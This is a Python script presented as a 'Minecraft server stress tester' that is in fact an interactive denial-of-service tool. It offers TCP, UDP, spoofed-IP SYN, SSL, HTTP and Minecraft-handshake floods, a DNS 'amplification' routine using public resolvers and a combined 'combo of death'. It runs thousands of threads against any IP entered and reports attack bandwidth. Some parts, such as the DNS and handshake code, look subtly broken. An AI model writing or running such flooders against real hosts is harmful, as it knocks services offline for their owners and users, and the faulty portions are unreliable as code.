#!/usr/bin/env python3
import socket
import random
import time
import threading
import argparse
from scapy.all import *
import psutil
import struct
import sys
import ssl
from colorama import Fore, Style
import dns.resolver
import asyncio
import aiohttp
import ipaddress

# GLOBAL CONFIG
MAX_THREADS = 10_000  # Extreme threading
PACKET_SIZE = 65_507  # Max UDP packet size
CONNECTION_TIMEOUT = 3  # Aggressive timeout
USE_SSL = True  # SSL/TLS flood option
DNS_AMPLIFICATION = True  # Enable DNS amplification
HTTP_FLOOD = True  # Enable HTTP flood
BYPASS_TECHNIQUES = True  # Enable bypass methods

class UltimateMinecraftStresser:
    def __init__(self):
        self.running = False
        self.attack_stats = {
            'total_packets': 0,
            'total_bytes': 0,
            'start_time': 0,
            'peak_gbps': 0,
            'open_ports': []
        }
        self.lock = threading.Lock()
        self.attack_methods = {
            '1': ('TCP MEGA FLOOD', self.tcp_mega_flood),
            '2': ('UDP EXTREME FLOOD', self.udp_extreme_flood),
            '3': ('SYN NUCLEAR FLOOD', self.syn_nuclear_flood),
            '4': ('MINECRAFT DESTROYER', self.minecraft_destroyer),
            '5': ('SSL/TLS CRUSHER', self.ssl_crusher),
            '6': ('DNS AMPLIFICATION', self.dns_amplification),
            '7': ('HTTP OVERLOAD', self.http_overload),
            '8': ('COMBO OF DEATH', self.combo_of_death)
        }

    def print_banner(self):
        print(Fore.RED + r"""
   _____ _    _ _______ _____   _____  _____ _____ _   _ _______ 
  / ____| |  | |__   __|  __ \ / ____|/ ____|_   _| \ | |__   __|
 | (___ | |  | |  | |  | |__) | |  __| (___   | | |  \| |  | |   
  \___ \| |  | |  | |  |  _  /| | |_ |\___ \  | | | . ` |  | |   
  ____) | |__| |  | |  | | \ \| |__| |____) |_| |_| |\  |  | |   
 |_____/ \____/   |_|  |_|  \_\\_____|_____/|_____|_| \_|  |_|   
        """ + Style.RESET_ALL)
        print(Fore.YELLOW + "ULTIMATE MINECRAFT SERVER STRESS TESTER")
        print(Fore.CYAN + "VPS-OPTIMIZED | MULTI-VECTOR | MAXIMUM DESTRUCTION")
        print(Style.RESET_ALL + "="*60)

    def get_random_ip(self):
        return str(ipaddress.IPv4Address(random.randint(1, 0xffffffff)))

    def generate_fake_minecraft_handshake(self):
        protocol_version = b'\x00'
        server_address = socket.inet_aton(self.target_ip)
        server_port = struct.pack('>H', self.target_port)
        next_state = b'\x02'
        return protocol_version + server_address + server_port + next_state

    async def dns_amplification_async(self, dns_server):
        try:
            resolver = dns.resolver.Resolver()
            resolver.nameservers = [dns_server]
            query = dns.message.make_query('example.com', dns.rdatatype.ANY)
            response = await resolver.resolve(query, lifetime=1)
            return len(response.to_wire())
        except:
            return 0

    def update_stats(self, bytes_sent):
        with self.lock:
            self.attack_stats['total_packets'] += 1
            self.attack_stats['total_bytes'] += bytes_sent
            elapsed = time.time() - self.attack_stats['start_time']
            current_gbps = (self.attack_stats['total_bytes'] * 8) / (1_000_000_000 * elapsed) if elapsed > 0 else 0
            if current_gbps > self.attack_stats['peak_gbps']:
                self.attack_stats['peak_gbps'] = current_gbps

    def tcp_mega_flood(self):
        payload = random._urandom(PACKET_SIZE)
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(CONNECTION_TIMEOUT)
                    s.connect((self.target_ip, self.target_port))
                    for _ in range(100):  # Send multiple packets per connection
                        s.send(payload)
                        self.update_stats(len(payload))
            except:
                pass

    def udp_extreme_flood(self):
        payload = random._urandom(PACKET_SIZE)
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.sendto(payload, (self.target_ip, self.target_port))
                    self.update_stats(len(payload))
            except:
                pass

    def syn_nuclear_flood(self):
        while self.running:
            try:
                src_port = random.randint(1024, 65535)
                src_ip = self.get_random_ip()
                ip_layer = IP(src=src_ip, dst=self.target_ip)
                tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S")
                packet = ip_layer/tcp_layer
                send(packet, verbose=0)
                self.update_stats(len(packet))
            except:
                pass

    def minecraft_destroyer(self):
        handshake = self.generate_fake_minecraft_handshake()
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(CONNECTION_TIMEOUT)
                    s.connect((self.target_ip, self.target_port))
                    for _ in range(50):  # Multiple handshakes per connection
                        s.send(handshake)
                        self.update_stats(len(handshake))
                        s.send(random._urandom(1024))  # Random Minecraft-like data
            except:
                pass

    def ssl_crusher(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        payload = random._urandom(8192)  # Large SSL payload
        
        while self.running:
            try:
                with socket.create_connection((self.target_ip, self.target_port), timeout=CONNECTION_TIMEOUT) as sock:
                    with context.wrap_socket(sock, server_hostname=self.target_ip) as ssock:
                        for _ in range(20):  # Multiple SSL packets
                            ssock.send(payload)
                            self.update_stats(len(payload))
            except:
                pass

    async def http_overload_async(self, session):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
            async with session.get(f"http://{self.target_ip}:{self.target_port}", 
                                 headers=headers, 
                                 timeout=aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT)) as response:
                data = await response.read()
                self.update_stats(len(data))
        except:
            pass

    async def dns_amplification(self):
        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        while self.running:
            for server in dns_servers:
                bytes_sent = await self.dns_amplification_async(server)
                self.update_stats(bytes_sent)

    async def combo_of_death(self):
        # Run all attacks simultaneously
        await asyncio.gather(
            asyncio.to_thread(self.tcp_mega_flood),
            asyncio.to_thread(self.udp_extreme_flood),
            asyncio.to_thread(self.syn_nuclear_flood),
            asyncio.to_thread(self.minecraft_destroyer),
            asyncio.to_thread(self.ssl_crusher),
            self.dns_amplification(),
            self.http_overload()
        )

    async def http_overload(self):
        async with aiohttp.ClientSession() as session:
            tasks = [self.http_overload_async(session) for _ in range(1000)]
            await asyncio.gather(*tasks)

    def port_scanner(self):
        common_ports = [25565, 80, 443, 53, 22, 21, 3389]
        print(Fore.YELLOW + "\n[+] Scanning for open ports..." + Style.RESET_ALL)
        for port in common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    if s.connect_ex((self.target_ip, port)) == 0:
                        self.attack_stats['open_ports'].append(port)
                        print(Fore.GREEN + f"[+] Port {port} is open!" + Style.RESET_ALL)
            except:
                pass

    def print_stats(self):
        elapsed = time.time() - self.attack_stats['start_time']
        gbps = (self.attack_stats['total_bytes'] * 8) / (1_000_000_000 * elapsed) if elapsed > 0 else 0
        pps = self.attack_stats['total_packets'] / elapsed if elapsed > 0 else 0
        
        print(Fore.CYAN + "\n[ ATTACK STATISTICS ]" + Style.RESET_ALL)
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Total Packets: {self.attack_stats['total_packets']:,}")
        print(f"Total Data: {self.attack_stats['total_bytes'] / (1024**3):.2f} GB")
        print(f"Current Bandwidth: {gbps:.2f} Gbps")
        print(f"Peak Bandwidth: {self.attack_stats['peak_gbps']:.2f} Gbps")
        print(f"Packets Per Second: {pps:,.0f}")

    async def run_attack(self, method):
        self.running = True
        self.attack_stats['start_time'] = time.time()
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self.print_stats_loop)
        monitor_thread.daemon = True
        monitor_thread.start()

        try:
            if method == '8':  # Combo attack
                await self.combo_of_death()
            elif method in ['6', '7']:  # Async attacks
                if method == '6':
                    await self.dns_amplification()
                elif method == '7':
                    await self.http_overload()
            else:  # Threaded attacks
                threads = []
                for _ in range(MAX_THREADS):
                    t = threading.Thread(target=self.attack_methods[method][1])
                    t.daemon = True
                    t.start()
                    threads.append(t)
                
                while self.running:
                    time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\n[!] Attack stopped by user" + Style.RESET_ALL)
        finally:
            self.running = False
            self.print_stats()

    def print_stats_loop(self):
        while self.running:
            self.print_stats()
            time.sleep(5)

    def interactive_menu(self):
        self.print_banner()
        print(Fore.YELLOW + "SELECT ATTACK METHOD:\n" + Style.RESET_ALL)
        for key, (name, _) in self.attack_methods.items():
            print(f"[{key}] {name}")
        
        choice = input("\nSelect attack method (1-8): ")
        if choice not in self.attack_methods:
            print(Fore.RED + "Invalid choice!" + Style.RESET_ALL)
            return
        
        self.target_ip = input("Enter target IP: ")
        self.target_port = int(input("Enter target port (default 25565): ") or 25565)
        duration = int(input("Attack duration (seconds, 0=forever): ") or 0)
        
        self.port_scanner()
        
        print(Fore.RED + "\n[!] STARTING ATTACK IN 3 SECONDS..." + Style.RESET_ALL)
        time.sleep(3)
        
        try:
            asyncio.run(self.run_attack(choice))
        except KeyboardInterrupt:
            self.running = False
            print(Fore.RED + "\n[!] Attack stopped" + Style.RESET_ALL)

if __name__ == "__main__":
    tester = UltimateMinecraftStresser()
    tester.interactive_menu()